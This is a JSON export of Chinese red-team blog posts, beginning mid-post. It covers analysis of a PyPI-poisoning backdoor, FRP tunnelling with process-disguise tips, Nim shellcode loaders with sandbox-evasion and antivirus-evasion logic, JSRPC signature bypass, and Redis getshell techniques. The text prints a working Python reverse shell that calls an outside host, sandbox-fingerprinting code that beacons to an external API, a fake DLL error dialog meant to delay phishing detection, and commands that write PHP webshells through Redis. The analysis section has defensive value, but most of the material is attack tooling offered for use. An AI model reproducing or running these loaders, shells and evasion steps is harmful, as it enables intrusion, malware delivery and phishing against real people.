s.settimeout(2) chunk = s.recv(1024) while chunk: f.write(chunk) try: chunk = s.recv(1024) except socket.timeout as e: break s.settimeout(None) f.close() def upload_file(file_name): f = open(file_name, 'rb') s.send(f.read()) def shell(): while True: command = reliable_recv() if command == 'quit': break elif command == 'background': # BEGIN pass elif command == 'help': # ideally to be removed pass elif command == 'clear': pass # END elif command[:3] == 'cd ': os.chdir(command[3:]) elif command[:6] == 'upload': download_file(command[7:]) elif command[:8] == 'download': upload_file(command[9:]) elif command[:7] == 'sendall': subprocess.Popen(command[8:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) else: execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) result = execute.stdout.read() + execute.stderr.read() result = result.decode() reliable_send(result) def connection(): while True: time.sleep(5) try: s.connect(('blazywound.ignorelist.com', 5008)) shell() s.close() break except: connection() s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) connection() 2.5 项目作者 通过对投毒项目的宿主进行查看，发现此用户自称为漏洞赏金猎人和渗透测试人员的一名大学生，自我介绍包装的几乎完美，且拥有近300名的关注者，共发布35个原创红队相关项目。 https://github.com/machine1337?tab=repositories&amp;q=&amp;type=source&amp;language=&amp;sort= 经过调查，所有Python项目都是相同手法，通过PYPI依赖库进行部署后门，早期项目还有使用sh文件的手法，最早的后门项目存在于2021.9.24，并于2022.11月到12月账号恢复活跃。 0x03 分析结果 一名2022.11月到12月恢复活跃的专门针对红队的钓鱼人员或者某个组织，通过投毒PYPI依赖库，再发布后处理免杀项目及其他红队项目进行导入依赖，经过七层中转的加密代码，最终与blazywound.ignorelist.co:5008进行socket通信进行上线机器，后门实际拥有的功能为: 切换工作目录、上传文件、下载文件、任意命令执行。 0x04 IOC Host blazywound.ignorelist.co:5008 Hash Linux md5 Hash /tmp/file.py ee69b2d189165555d4ec32f944cb262c /home/$USER/.msfdb/update/.path.sh 5412834b8be0ee5cdeeede11430ca17c /home/$USER/.msfdb/update/update.py c855106e06b259d2b30bd754561ea9a ","link":"https://www.svenbeast.com/post/ZVscVsf50/"},{"title":"redteam之实战隧道代理方案","content":"0x01 浅言 ​ 在红队行动中，搭建隧道几乎可以说是必遇到的攻击场景之一，所以提前准备好相应的隧道代理方案对于提高攻击效率尤为重要，实际项目中会遇到的问题也是本文主要解决的问题如下: 1.每多一层代理就重头开始搭建一次隧道，无序且混乱 2.杀软查杀 3.代理进程特征明显，被目标或其他队伍发现异常导致代理掉线，将时间浪费在重复搭建的过程中 0x02 拓扑图及工具 项目地址: https://github.com/DongHuangT1/Frp 此二开版支持websocket协议的域前置，将用做入口点机器的隧道搭建 项目地址: https://github.com/Goqi/Erfrp 此二开版修改了流量特征，将用做内网机器的隧道搭建 FRP多级代理拓扑图: https://github.com/sv3nbeast/Frp-Mapping 文字描述繁琐且不好理解，这里画一个多级代理的拓扑图方便理解 ​ 实际上frp经过修改过的源码杀软查杀并不严重，所以二开过的frp，过杀软可以算是一个被动技能，若有习惯其他优秀隧道软件的，如stowaway、fuso、nps等，推荐按此文理清代理逻辑进行方案复刻。 0x03 代理流程 ​ 通过编写的多级代理拓扑图可以发现不同层级代理的一点区别，无论是入口点机器还是内网机器无非就是提前在客户端配置文件内写好客户端和服务端的端口对应，那么为什么不从一开始就使用多级代理的配置文件从而避免内网横向后重新搭建二层、三层代理呢，遂这里提供个人在使用的最高支持三级代理的配置文件。 ! 1.公网服务端 #frps.ini [common] token = xxxxxx bind_port = 80 websocket_path = /xxxxx dingding_token = 2.入口点客户端 #frpc.ini [common] token = xxxxxx del_enable = true server_addr = author.xxx.com.xx.xx.com.cn server_port = 80 protocol = websocket websocket_path = /xxxxx websocket_host = author.xxx.com [socks5_to_1] type = tcp remote_port = 20000 plugin = socks5 plugin_user = admin plugin_passwd = admin123 use_encryption = true use_compression = true [socks5_to_2] type = tcp local_ip = 127.0.0.1 local_port = 10088 remote_port = 12020 [socks5_to_3] type = tcp local_ip = 127.0.0.1 local_port = 11088 remote_port = 13020 3.入口点服务端 #frps.ini [common] bind_port = 7000 4.二级代理机客户端 #frpc.ini [common] #入口点服务端机器的IP server_addr = 192.168.3.75 server_port = 7000 [socks5_to_1] type = tcp plugin = socks5 remote_port = 10088 [socks5_to_2] type = tcp local_ip = 127.0.0.1 local_port = 12088 remote_port = 11088 5.二级代理机服务端 #frps.ini [common] bind_port = 7000 6.三级代理机客户端 #frpc.ini [common] #二级代理服务端机器的IP server_addr = 192.168.3.144 server_port = 7000 [socks5_to_1] type = tcp plugin = socks5 remote_port = 12088 不同层级代理连接地址 入口点机器代理 socks5 100.100.100.100:20000 admin admin123 二级代理机器代理 socks5 100.100.100.100:12020 无密码 三级代理机器代理 socks5 100.100.100.100:13020 无密码 ​ 上面是最多支持三级代理的各个配置文件和连接信息，每次项目开始搭建第一个隧道时直接按照三级代理的层级进行搭建即可，每多一层直接在下一台机器进行连接。 注: 因为使用了2种二开版frp，所以在使用时需保证客户端和服务端为同一种frp 0x04 算不上tips的tips 启动方式 ​ frp默认会加载当前目录下的frpc.ini文件，建议直接修改携带伪装性的frp文件名字，如linux的agent、windows的svchost.exe，并上传frpc.ini到当前目录，这样直接启动不需要携带任何参数，然后删除配置文件即可，虽然很多人使用的frp支持http远程加载和加密参数传输，但就特征而言，是很明显的，通过传参进行确定曾经kill过很多其他队伍的代理工具，所以不建议传任何参数。 如果觉得上传frpc.ini文件不习惯，可以修改此文件/cmd/frpc/sub/root.go，将默认加载的配置文件改成其他名字重新编译。 删除文件 ​ linux启动代理后不光可以删除配置文件，二进制文件也可以一起删掉，不会影响已启动得代理进程，在linux机中养成好习惯，运行后删除文件 0x05 结束 再总结一下优点: 按部就班，逻辑清晰，每次只需修改配置文件中的ip 搭建好后可以任意选择层级进行连接，而不是只能连接一层 不必考虑杀软 无进程特征 ","link":"https://www.svenbeast.com/post/NIsft997g/"},{"title":"Pentesting active directory 思路一览图","content":" 参考链接: https://github.com/Orange-Cyberdefense/ocd-mindmaps ","link":"https://www.svenbeast.com/post/flYRjNxuy/"},{"title":"Nim之Bypass Sandbox和免杀的过程记录","content":"0x01 获得各沙箱平台的系统信息 利用bark软件接受http请求，回显沙箱系统配置 获得cpu和运行内存，通用沙箱过滤 &lt;2 &lt;2048的机器 微步Win10沙箱cpu为4核，运行内存6143mb，C盘容量136829726720 微步Win7_x64沙箱cpu为4核，运行内存6143mb，C盘容量137331994624 奇安信沙箱cpu为4核，运行内存8190mb，C盘容量322015588352 cpu为4核，运行内存8191mb， C盘容量239981297664 (这个大概率是QAX的，不太确定，不是直接收到的请求) VT平台沙箱，会有很多请求，根据代码设置的时间戳区分收到的机器配置 具体都什么配置自行尝试，挺多的，且带有持续性，停不下来，很多人用vt的接口下载下来分析 后面发现大部分的VT沙箱都可以根据通用沙箱过滤规则过滤掉，出现最多的配置是2047和2 360的在线沙箱平台不支持x64程序，所以不构成威胁，360安全卫士或者杀毒的自动上传本地文件到云沙箱功能还没时间测试 下面是使用NIM获得我想要的信息的具体代码，而且必须吐槽一下，NIM很恶心，可以说是ctrl c v的宿敌，资料少的可怜到爆炸 import winlean,HttpClient,times #auther:https://github.com/sv3nbeast type TPartitionInfo* = tuple[FreeSpace, TotalSpace: FileTime] HANDLE* = int HWND* = HANDLE UINT* = int32 LPCSTR* = cstring let randNum = $getTime().toUnix() proc getFileSize*(file: string): BiggestInt = ## Retrieves the size of the specified file. var fileData: WIN32_FIND_DATA when useWinUnicode: var aa = newWideCString(file) let hFile = findFirstFileW(aa, fileData) else: let hFile = findFirstFileA(file, fileData) if hFile == INVALID_HANDLE_VALUE: raise newException(IOError, $getLastError()) return fileData.nFileSizeLow proc getDiskFreeSpaceEx*(lpDirectoryName: cstring, lpFreeBytesAvailableToCaller, lpTotalNumberOfBytes, lpTotalNumberOfFreeBytes: var FileTime): WINBOOL{. stdcall, dynlib: &quot;kernel32&quot;, importc: &quot;GetDiskFreeSpaceExA&quot;.} #获得磁盘情况 proc getPartitionInfo*(partition: string): TPartitionInfo = # Retrieves partition info, for example ``partition`` may be ``&quot;C:\\&quot;`` #freeBytes:已使用字节 #totalBytes:磁盘总容量 var freeBytes, totalBytes, totalFreeBytes: FileTime discard getDiskFreeSpaceEx(partition, freeBytes, totalBytes, totalFreeBytes) # var num = rdFileTime(totalBytes) # var client = newHttpClient() # var url = &quot;http://api.day.app/VRzPbPFcQCYKtS3wr7Tbgf/disk/&quot; #获得磁盘总容量 # url.add($randNum) # url.add(&quot;: &quot;) # url.add($num) # try: # var err = client.getContent(url) # except: # return (freeBytes,totalBytes) return (freeBytes,totalBytes) #获取cpu数量 proc huasidsiuohiuodsaih():int = when defined(windows): type SYSTEM_INFO {.final, pure.} = object u1: int32 dwPageSize: int32 lpMinimumApplicationAddress: pointer lpMaximumApplicationAddress: pointer dwActiveProcessorMask: ptr int32 dwNumberOfProcessors: int32 dwProcessorType: int32 dwAllocationGranularity: int32 wProcessorLevel: int16 wProcessorRevision: int16 proc GetSystemInfo(lpSystemInfo: var SYSTEM_INFO) {.stdcall, dynlib: &quot;kernel32&quot;, importc: &quot;GetSystemInfo&quot;.} var si: SYSTEM_INFO GetSystemInfo(si) # var num = si.dwNumberOfProcessors # var client = newHttpClient() # var url = &quot;http://api.day.app/VRzPbPFcQCYKtS3wr7Tbgf/cpu/&quot; # url.add($randNum) # url.add(&quot;: &quot;) # url.add($num) # try: # var err = client.getContent(url) # except: # return si.dwNumberOfProcessors return si.dwNumberOfProcessors #获取内存大小 proc ihojhhasioadsoiihodas():int64 = when defined(windows): type TMEMORYSTATUSEX {.final, pure.} = object dwLength: int32 dwMemoryLoad: int32 ullTotalPhys: int64 ullAvailPhys: int64 ullTotalPageFile: int64 ullAvailPageFile: int64 ullTotalVirtual: int64 ullAvailVirtual: int64 ullAvailExtendedVirtual: int64 proc globalMemoryStatusEx(lpBuffer: var TMEMORYSTATUSEX) {.stdcall, dynlib: &quot;kernel32&quot;,importc: &quot;GlobalMemoryStatusEx&quot;.} var statex: TMEMORYSTATUSEX statex.dwLength = sizeof(statex).int32 globalMemoryStatusEx(statex) # var num = statex.ullTotalPhys shr 20 # var client = newHttpClient() # var url = &quot;http://api.day.app/VRzPbPFcQCYKtS3wr7Tbgf/ram/&quot; # url.add($randNum) # url.add(&quot;: &quot;) # url.add($num) # try: # var err = client.getContent(url) # except: # return statex.ullTotalPhys shr 20 return statex.ullTotalPhys shr 20 when defined(windows): when isMainModule: var huasidsiuohiuodsaih1 = huasidsiuohiuodsaih() #cpu var ihojhhasioadsoiihodas1 = ihojhhasioadsoiihodas() #ram var saolkpomsiejskraqjgir1 = rdFileTime(getPartitionInfo(r&quot;C:\\&quot;)[1]) #disk var client = newHttpClient() var url = &quot;http://api.day.app/VRzPbPFcQCYKtS3wr7Tbgf/Defender/&quot; url.add($huasidsiuohiuodsaih1) url.add(&quot;:&quot;) url.add($ihojhhasioadsoiihodas1) url.add(&quot;:&quot;) url.add($saolkpomsiejskraqjgir1) var jsfile = &quot;https://hectorstatic.baidu.com/cd37ed75a9387c5b.js&quot; try: var err = client.getContent(url) except: echo &quot;Success!&quot; 0x02 制作免杀EXE 具体代码 带免沙箱代码的NIM执行shellcode代码，目前VT的沙箱特征没加，有待收集齐全，有空再说吧 import winlean,HttpClient,winim #auther:https://github.com/sv3nbeast type TPartitionInfo* = tuple[FreeSpace, TotalSpace: winlean.FILETIME] HANDLE* = int HWND* = HANDLE UINT* = int32 LPCSTR* = cstring proc MessageBox*(hWnd: HWND, lpText: LPCSTR, lpCaption: LPCSTR, uType: UINT): int32 {.discardable, stdcall, dynlib: &quot;user32&quot;, importc: &quot;MessageBoxA&quot;.} proc getFileSize*(file: string): BiggestInt = ## Retrieves the size of the specified file. var fileData: winlean.WIN32_FIND_DATA when useWinUnicode: var aa = newWideCString(file) let hFile = findFirstFileW(aa, fileData) else: let hFile = findFirstFileA(file, fileData) if hFile == winlean.INVALID_HANDLE_VALUE: raise newException(IOError, $getLastError()) return fileData.nFileSizeLow proc getDiskFreeSpaceEx*(lpDirectoryName: cstring, lpFreeBytesAvailableToCaller, lpTotalNumberOfBytes, lpTotalNumberOfFreeBytes: var winlean.FILETIME): winlean.WINBOOL{. stdcall, dynlib: &quot;kernel32&quot;, importc: &quot;GetDiskFreeSpaceExA&quot;.} #获得磁盘情况 proc getPartitionInfo*(partition: string): TPartitionInfo = #freeBytes:已使用字节 #totalBytes:磁盘总容量 var freeBytes, totalBytes, totalFreeBytes: winlean.FILETIME discard getDiskFreeSpaceEx(partition, freeBytes, totalBytes, totalFreeBytes) return (freeBytes,totalBytes) #获取cpu数量 proc huasidsiuohiuodsaih():int = when defined(windows): type SYSTEM_INFO {.final, pure.} = object u1: int32 dwPageSize: int32 lpMinimumApplicationAddress: pointer lpMaximumApplicationAddress: pointer dwActiveProcessorMask: ptr int32 dwNumberOfProcessors: int32 dwProcessorType: int32 dwAllocationGranularity: int32 wProcessorLevel: int16 wProcessorRevision: int16 proc GetSystemInfo(lpSystemInfo: var SYSTEM_INFO) {.stdcall, dynlib: &quot;kernel32&quot;, importc: &quot;GetSystemInfo&quot;.} var si: SYSTEM_INFO GetSystemInfo(si) return si.dwNumberOfProcessors #获取内存大小 proc ihojhhasioadsoiihodas():int64 = when defined(windows): type TMEMORYSTATUSEX {.final, pure.} = object dwLength: int32 dwMemoryLoad: int32 ullTotalPhys: int64 ullAvailPhys: int64 ullTotalPageFile: int64 ullAvailPageFile: int64 ullTotalVirtual: int64 ullAvailVirtual: int64 ullAvailExtendedVirtual: int64 proc globalMemoryStatusEx(lpBuffer: var TMEMORYSTATUSEX) {.stdcall, dynlib: &quot;kernel32&quot;,importc: &quot;GlobalMemoryStatusEx&quot;.} var statex: TMEMORYSTATUSEX statex.dwLength = sizeof(statex).int32 globalMemoryStatusEx(statex) return statex.ullTotalPhys shr 20 proc innerMain(shellcode: ptr, size: int): void = #shellcode执行主体 let tProcess = GetCurrentProcessId() var pHandle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess) let rPtr = VirtualAllocEx( pHandle, NULL, cast[SIZE_T](size), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE ) copyMem(rPtr, shellcode, size) let f = cast[proc(){.nimcall.}](rPtr) f() when defined(windows): when isMainModule: # MessageBox(0, (LPCWSTR)(L&quot;无法打开文档，因为计算机中丢失 MSVCP140.dll。 尝试重新安装该程序以解决此问题。&quot;), &quot;Error&quot;, MB_OK) #部分钓鱼情况开启此功能，让中招者解决电脑玄学问题从而延迟钓鱼邮件发现时间 var huasidsiuohiuodsaih1 = huasidsiuohiuodsaih() #cpu var ihojhhasioadsoiihodas1 = ihojhhasioadsoiihodas() #ram var saolkpomsiejskraqjgir1 = rdFileTime(getPartitionInfo(r&quot;C:\\&quot;)[1]) #disk if not (huasidsiuohiuodsaih1 == 4 and ihojhhasioadsoiihodas1 == 6143 and saolkpomsiejskraqjgir1 == 136829726720): #微步win10沙箱 if not (huasidsiuohiuodsaih1 == 4 and ihojhhasioadsoiihodas1 == 6143 and saolkpomsiejskraqjgir1 == 137331994624): #微步win7沙箱 if not (huasidsiuohiuodsaih1 == 4 and ihojhhasioadsoiihodas1 == 8190 and saolkpomsiejskraqjgir1 == 322015588352): #qax的win7沙箱 if huasidsiuohiuodsaih1 &gt; 2 and ihojhhasioadsoiihodas1 &gt; 2046: #通用沙箱 const sc_length: int = 1000 #输入shellcode var shellcode: seq[byte] = @[byte 0x4D,0x5A,0x41,0x52,0x55,0x48] #Replace with your own shellcode var shellcodePtr = (cast[ptr array[sc_length, byte]](addr shellcode[0])) innerMain(shellcodePtr, len(shellcode)) shellcode生成办法 第一种 使用CS生成raw格式的，cs有两个位置可以生成raw包，注意位置，意思大概是shellcode分为无状态和有状态，具体那个是那个记不清了，区别是一个直接上线，一个还要再向CS服务端请求一个stage文件，这个是直接上线的生成方式，生成的raw需要进行二次处理转变为0x00格式的，写好的python代码奉上 #!/usr/bin python3 # -*- coding: utf-8 -*- #auther:https://github.com/sv3nbeast import binascii,re def analysis(bin_path: str, out_txt_path: str,out_file_path_0x: str): with open(bin_path, 'rb') as f: # 读取全部行 all_data = f.readlines() with open(out_txt_path, 'a+') as new_f: for i in all_data: # 二进制（bytes）类型转换成十六进制类型 hex_str = binascii.b2a_hex(i).decode('unicode_escape') # 以str格式逐行写入到文本 new_f.write(str(hex_str).swapcase()) print(&quot;hex转换完成&quot;) with open(out_txt_path,'r') as hex: with open(out_file_path_0x,'a+') as payload: all_data = hex.readlines() d = '' for i in all_data: b = re.findall(r'.{2}',i) c = ',0x'.join(b) d = d + c f = &quot;0x&quot; + d payload.write(f) print(&quot;payload转换完成&quot;) if __name__ == '__main__': input_file_path = &quot;./beacon.bin&quot; out_file_path = &quot;./hex.txt&quot; out_file_path_0x = &quot;./0x00.txt&quot; analysis(input_file_path, out_file_path,out_file_path_0x) 第二种 直接获得0x00格式的shellcode，这个生成简单，不过会多个请求cs服务端的url特征 mac的编译命令 nim c -d:mingw -d:release --opt:speed --app:gui --cpu:amd64 sven.nim --opt的speed意思是速度优化 --opt的size意思是文件大小优化 --app的gui意思是执行exe的时候不出现黑框 --app的console意思是执行exe的时候出现黑框，我用来输出信息调试代码，以后查杀gui严格后可以改用console在用代码关闭黑框，代码已实现 win的编译命令 nim c --opt:size -d:release --app:gui sven.nim 命令的意思和mac一样 钓鱼 其中的MessageBox这行代码和钓鱼有关系，也可以自行根据实际情况改，弹个框，引导中招的人解决电脑的玄学问题，延迟钓鱼邮件发现时间 生成文件大小 根据shellcode的区别，最终编译的文件大小如下 800-900kb 300-500kb 0x03 为啥能免杀 主要是用了NIM语言本身的小众，他自带大部分的免杀效果，还能配合mac的交叉编译 同时如果选择生成shellcode方法是第一种(当然不论哪种目前都是可以的)，那么cs生成的是stageless的shellcode，这种的shellcode不会再去向服务器发起获取stage的请求，也就是说减少了那个请求cs的checksum8特征url，url大概长这样 http:test.safe.com/Hjla 0x04 继续增加免杀效果 利用SigThief增加数字签名，同样可以增加存活一段时间 对shellcode加密，防止硬编码在NIM，目前代码已实现，是自己也在用的一个版本，不过这种制作方式暂时还不到必须用的地步，先等不加密的被杀了再用 沙箱会对EXE的静态分析中正则匹配URL，所以可以静态加入一些正规域名的url链接配合域前置的正规域名混淆视听，我的域前置根域名是baidu.com，所以我加入的是baidu的链接，当然只是为了干扰那些只是根据沙箱运行结果进行人工判断的摸鱼防守，一点恶趣味 毕竟不是专业的，受限代码水平哈 0x05 还有个在线免杀 http://124.223.65.106:9000/ 使用cs的payload生成器生成raw格式的payload.bin文件上传即可 这个也是用了NIM写的，网页是python启的django，NIM代码和上面的不一样，一些简单项目就用这个，复杂的我自己做对应的定制版，并且没有mac的交叉编译效果要弱一些，代码里有通用沙箱的过滤代码，shellcode加解密代码，最后给exe文件加了360的签名(签名是否添加可自行选择) ","link":"https://www.svenbeast.com/post/yRPqlWutW/"},{"title":"加解密传输通杀方案之JSRPC","content":"0x01 序言 前端的加解密一直是很多师傅经常遇到过的问题，一个加解密传输，签名，防篡改，导致很多时候没有办法对参数的值进行更改，代码中存在的web漏洞也没办法测试出来，当然这也是一种符合所有场景的防御办法，增加攻击成本，是一个很棒的防御方案。 有的师傅测试遇到时无非会有几种想法: 这个还需要研究js，emm，不太会，以后再学习(然后鸽鸽鸽 这个研究一段时间应该也能尝试一下，以前貌似看到过这种文章，照着文章研究一天应该也可以试试，但是好浪费时间，最后也不一定弄好，弄好也不一定有洞，下次有机会在测吧(然后鸽鸽鸽 好麻烦，还要把用到的js弄下来本地运行，有的是打包的js还不能用，有的还要修改里面的js代码，为什么要这么麻烦，这次测试差不多就得了，摸鱼才是真理(然后摸摸摸 ps: 有的师傅确实时间紧任务重，可以理解，毕竟如果是半吊子去安排任务大部分都会觉得时间给的很充足~ 0x02 JSRPC理解 对于我们来说，jsrpc就是将本地和浏览器，看做是服务端和客户端，二者之间通过 WebSocket 协议进行 RPC 通信，在浏览器中将加密函数暴露出来，在本地直接调用浏览器中对应的加密函数，从而得到加密结果，不必去在意函数具体的执行逻辑，也省去了扣代码、补环境等操作，可以省去大量的逆向调试时间。 0x03 一次完整的某银行网站利用jsrpc解决js加密传输的笔记 1.下载jsrpc，同样用jsrpc技术的项目还有sekiro，我的目标为https站点，注释掉main.go的197行和198行，解除194行的注释，进行编译生成运行 2.打开网站f12的控制台，打开工具里面的jsenv.js，内容全部复制，复制到控制台直接运行，这样这个代码就注入了 3.控制台继续添加js代码，作用是使用js的websocket协议连接上面工具运行开放的12080端口，group和name的值随意，后面使用链接的时候值一样就行，可以当做一句话木马的密码逻辑理解 4.发现网站会每次生成sign放入header中，修改参数及值会导致访问网站失败，所以每次改值就需要生成对应的签名 5.根据sign关键字去js代码中寻找加密点 6.给这个函数末尾添加断点，网站正常运行，发现目标网站存在js反调试，如果网站没有反调试的这步忽略即可，这里利用burp的匹配并替换的功能替换网站2处反调试的js代码，具体原理不多说了，这个不是今天主角 7.网站正常调试，运行至断点处，此时回到控制台，对js中的函数和值进行输出，验证是否满足加密要求,console.log(r),u(&quot;aaaa&quot;)，发现r变量确实是sign的值，u函数确实是加密函数，根据传入的值生成加密结果存入r 8.断点，yyds，此时控制台能正常调用加密函数了，需要把u函数改为全局函数，意思就是以后不需要断点也能够调用这个函数的意思，使用代码window.test = u，控制台输入即可，关闭调试功能，发现控制台直接调用test函数，就相等于调用u函数了 9.继续控制台注入js代码，hacker2就是action参数的值，看了远程调用的url就明白了，http://127.0.0.1:12080/go?group=zzz&amp;name=hlg&amp;action=hacker2&amp;param=xxxxxxxxxx demo.regAction(&quot;hacker2&quot;, function (resolve,param) { console.log(param); var base666 = test(param); //test就是上面那个加密函数 resolve(base666); }) 比如想对字符串sven加密，这样就可以直接远程调用浏览器的加密函数了，加密api +1，之后随意你怎么使用都可以了，各显神通,任意发挥即可，或许等autoDecode这个bp插件以后功能更全面了，没准直接能对接上 10.我这里是用mitmdump弄了个py中转，burp的包转到这个代理上，对请求进行一个加工后转发。自动获得我需要的参数和值当做字符串，然后请求调用控制台的api获得加密后的sign值，替换到burp发来的请求包里，再将请求发出去，这样什么工具只要通过burp发送请求，就都会是签名正确的请求了 #encrypt.js import requests import json from urllib.parse import unquote from urllib.parse import quote def request(flow): print('request url is %s' % flow.request.url) /* 随意对flow的值进行修改即可，同时要注意url编码问题 sign = json.loads(requests.get(&quot;http://127.0.0.1:12080/go?group=zzz&amp;name=hlg&amp;action=hacker2&amp;param={}&quot;.format(&quot;想要加密的字符串&quot;)).text) flow.request.headers['Sign'] = sign['data'] */ 0x04 总结 1.无需太高的js代码水平 2.步骤大多都是机械可重复步骤 3.无论js什么格式，都不影响操作 4.当然也会有一些知识会影响使用理解，比如浏览器调试水平，阅读理解水平，burp使用水平，漏洞逻辑理解水平 5.内卷驱动器 ","link":"https://www.svenbeast.com/post/kn2fEdp4Q/"},{"title":"利用Redis Getshell的所有利用方法","content":"0x00 Redis 简介 Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。由于其自身特点，可以广泛应用在数据集群，分布式队列，信息中间件等网络架构中，在内网渗透的突破中，常常扮演getshell的角色，redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步。 总结 — 一个数据库，默认端口是6379，拥有很多漏洞。 0x01 环境 &amp; 工具准备 Linux 编译安装，安装后仅能在安装目录下运行 wget https://download.redis.io/releases/redis-6.2.5.tar.gz tar xzf redis-6.2.5.tar.gz cd redis-6.2.5 make # 启动 redis 服务，可以指定配置文件启动(若不指定则以默认的配置文件启动) cd src ./redis-server # 启动 redis 客户端 ./redis-cli Windows 安装 https://github.com/MicrosoftArchive/redis/releases 下载 Redis-x64-3.0.504.zip 并解压 redis-server.exe redis.windows.conf Docker安装 docker pull vertigo/redis4 docker run -p 6379:6379 vertigo/redis4 可能用到的利用工具 redis-cli MDUT RedisWriteFile dll-hijacking Gopherus 0x02 Redis 语法 Redis 键命令的基本语法为： COMMAND KEY_NAME 使用 * 可以获取所有配置项(GET 、 KEYS) 使用 SET 和 GET 命令，可以完成基本的赋值和取值操作； Redis 不区分命令的大小写，set 和 SET 是同一个意思； 如果键的值中有空格，需要使用双引号括起来； SET key &quot;Hello World&quot; # 设置键 key 的值为字符串 Hello World GET key # 获取键 key 的值，如果 key 不存在，返回 nil 。如果key 储存的值不是字符串类型，返回一个错误 DEL key # 删除键 key KEYS * # 获取 redis 中所有的 key,Keys 命令用于查找所有符合给定模式 pattern 的 key SAVE # 用于创建当前数据库的备份,在 redis 安装目录中创建dump.rdb文件 CONFIG GET requirepass # 用于获取 redis 服务的配置参数，通过 CONFIG 命令查看或设置配置项 CONFIG REWRITE requirepass &quot;123456&quot; # 对 redis.conf 配置文件进行改写，重启后才会被修改 CONFIG SET requirepass &quot;123456&quot; # 动态地调整 Redis 服务器的配置(configuration)而无须重启 Flushall # 用于清空整个 Redis 服务器的数据(删除所有数据库的所有 key) SELECT index # Redis Select 命令用于切换到指定的数据库，数据库索引号 index 用数字值指定，以 0 作为起始索引值。 0x03 Redis 配置文件 Redis 的配置文件位于 Redis 安装目录下，文件名为 redis.conf(Windows 名为 redis.windows.conf)。当然也可以通过指定配置文件来进行启动。列举一些重要的配置项进行说明。 配置项 说明 port 6379 指定 Redis 监听端口，默认端口为 6379 bind 127.0.0.1 绑定的主机地址，格式为bind后面接IP地址，可以同时绑定在多个IP地址上，IP地址之间用空格分离，如 bind 192.168.1.100 10.0.0.1，表示同时绑定在192.168.1.100和10.0.0.1两个IP地址上。如果没有指定bind参数，则绑定在本机的所有IP地址上。 save 格式为 save &lt;秒数&gt; &lt;变化数&gt;，表示在指定的秒数内数据库存在指定的改变数时自动进行备份也就是指定在多长时间内，有多少次更新操作，就将数据同步到数据文件，可以多个条件配合 dbfilename dump.rdb 指定本地数据库文件名，默认值为 dump.rdb dir ./ 指定本地数据库存放目录，指明 Redis 的工作目录为设定的目录，Redis 产生的备份文件将放在这个目录下 requirepass foobared 设置 Redis 连接密码，如果配置了连接密码，客户端在连接 Redis 时需要通过 AUTH 命令提供密码，默认关闭 protected-mode redis3.2 版本后新增 protected-mode 配置，默认是 yes ，用于设置外部网络连接 redis 服务。关闭 protected-mode 模式，此时外部网络可以直接访问。开启 protected-mode 保护模式，需配置 bind ip 或者设置访问密码。 0x04 Redis Win&amp;Linxu 漏洞利用 Redis未授权 1.漏洞利用 下载Redis-v3.0,默认情况下开启redis-server.exe 利用数据库连接工具正常连接即可，无需密码 利用 Redis 写入webshell 1.漏洞原理 Redis存在持久化机制，分为手动触发和自动触发，可以使用save命令手动触发备份数据库中的数据，通过这个机制可以达到向服务器任意路径写入任意文件名和任意文件内容的目的。 2.利用场景 Redis 存在未授权访问或者暴破密码成功，最终连接Redis数据库成功的情况下，同时开启了 web 服务，知道 web 目录的绝对路径，具有文件读写权限 3.利用过程 # phpstudy下载安装，全程默认选项安装 https://public.xp.cn/upgrades/phpStudy_64.zip #实际利用中查看当前数据库是否有缓存 dbsize #有缓存时切换到其他数据库，redis默认有16个数据库，尽量寻找没有缓存或缓存较少的数据库 select 15 #若未发现有可利用数据库，根据情况决定是否需要使用此命令清除所有数据库 Flushall #开始利用 config set dir C:\\phpstudy_pro\\WWW config set dbfilename shell.php set xxx &quot;&lt;?php eval($_REQUEST[cmd]);?&gt;&quot; #\\r\\n\\r\\n 代表换行的意思，用redis写入文件的会自带一些版本信息，在写入一些后门文件时自行分辨是否需要添加换行符，个别文件如果不换行可能会导致无法执行 save 利用 Redis 主从复制 Getshell 1.漏洞原理 Redis 是一个使用 ANSIC 编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个 Redis 的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis 就提供了主从模式，主从模式就是指使用一个 redis 实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。基于 Redis 主从复制的机制，可以通过 FULLRESYNC 将任意文件同步到从节点（slave）从而利用漏洞获取权限。 2.利用场景 Redis 存在未授权访问或者暴破密码成功，最终连接Redis数据库成功的情况下，目标机和攻击机网络互通，并且redis版本范围为4.x、5.x，通过主从写入.so或者dll文件，从而使目标机执行so或dll文件中的命令执行函数。 3.利用过程 docker pull vertigo/redis4 docker run -p 6379:6379 vertigo/redis4 #利用工具 https://github.com/Dliv3/redis-rogue-server python3 redis-rogue-server.py --rhost=10.100.6.50(目标IP) --rport=6379 --lhost=10.100.4.189(本机IP) #退出工具时 ctrl+c 会自动执行清理exp.so模块的命令 #工具中使用的命令 1.config set dir ./ 2.config set dbfilename exp.so 3.slaveof X.X.X.115 4.slaveof X.X.X.115 21000 #上面看绑定的服务段端口是21000 5.module load ./exp.so 6.slaveof no one 7.system.exec 'whoami' #清理痕迹 8.config set dbfilename dump.rdb 9.system.exec 'rm ./exp.so' 10.module unload system 0x05 Redis Linux 漏洞利用 利用 Redis 写入SSH公钥 1.漏洞原理 ssh密钥登录怎么实现呢？通过工具生成公钥和对应的私钥，将公钥放在靶机特定位置特定文件名，攻击机就可以使用私钥去登录ssh。 redis操作同写webshell，只是将本机的ssh公钥作为value，然后通过修改数据库的默认路径为/root/.ssh和默认的文件名authorized.keys，把数据备份在authorized.keys文件里，这样就可以使用密钥进行登录。 2.利用场景 Redis 存在未授权访问或者暴破密码成功，最终连接Redis数据库成功的情况下，并且ssh服务对外开放，redis进程为高权限，可以通过密钥登认证。 3.利用过程 # 安装 